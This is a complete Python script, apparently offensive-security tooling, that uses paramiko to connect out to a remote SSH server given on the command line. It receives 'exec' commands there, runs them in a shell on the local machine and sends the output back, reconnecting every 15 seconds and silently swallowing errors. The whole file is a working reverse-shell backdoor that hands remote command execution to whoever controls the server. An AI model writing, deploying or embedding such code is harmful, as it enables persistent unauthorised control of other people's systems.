import paramiko
import subprocess
import sys
import time

#script args
server_address = sys.argv[1]
server_port = int(sys.argv[2])
username = sys.argv[3]
password = sys.argv[4]

def process_exec(client_session, command):
    try:
        command_output = subprocess.run(
            command, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            timeout=30
        )
        #send back the resulting output
        if len(command_output.stderr.decode('utf-8')):
            client_session.send(command_output.stderr.decode('utf-8'))
        elif len(command_output.stdout.decode('utf-8')):
            client_session.send(command_output.stdout.decode('utf-8'))
        else:
            client_session.send('[*] Process exited without output.')
    except subprocess.CalledProcessError as err:
        client_session.send(str(err))

def process_commands(client_session):
    command = client_session.recv(1024).decode('utf-8').split(" ")
    if command[0] == "exec":
        process_exec(client_session, " ".join(command[1:]))
    elif command[0] == "quit":
        client_session.close()
        raise Exception
    elif command[0] == "exit":
        client_session.close()
        sys.exit()
    else:
        client_session.send('[!] Command not recognized.')

#connect to the remote ssh server and recieve commands to be #executed and send back output
def ssh_command(server_address, server_port, username, password):
    #instantiate the ssh client
    client = paramiko.SSHClient()
    #optional is using keys instead of password auth
    #client.load_host_key('/path/to/file')
    #auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #connect to ssh server
    client.connect(
        server_address,
        port=server_port,
        username=username,
        password=password
    )
    #get ssh session
    client_session = client.get_transport().open_session()
    if client_session.active and not client_session.closed:
        #wait for command, execute and send result ouput
        while True:
            #use subprocess run with timeout of 30 seconds
            process_commands(client_session)
    client_session.close()
    return

while True:
    try:
        ssh_command(server_address, server_port, username, password)
    except KeyboardInterrupt:
        sys.exit()
    except Exception:
        pass
    time.sleep(15)
